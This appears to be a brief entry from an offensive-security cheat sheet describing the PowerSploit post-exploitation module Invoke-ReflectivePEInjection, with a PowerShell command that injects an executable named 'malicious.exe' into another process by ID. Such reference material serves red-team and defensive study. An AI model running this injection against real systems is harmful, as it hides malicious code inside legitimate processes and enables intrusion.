### **Powersploit (Invoke-ReflectivePEInjection)**

- **Description**: PowerSploit is a post-exploitation framework for PowerShell. The **Invoke-ReflectivePEInjection** module can perform PE injection into another process, which is part of the process hollowing technique.
```
Import-Module ./Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEPath "C:\malicious.exe" -ProcessID $processID

```

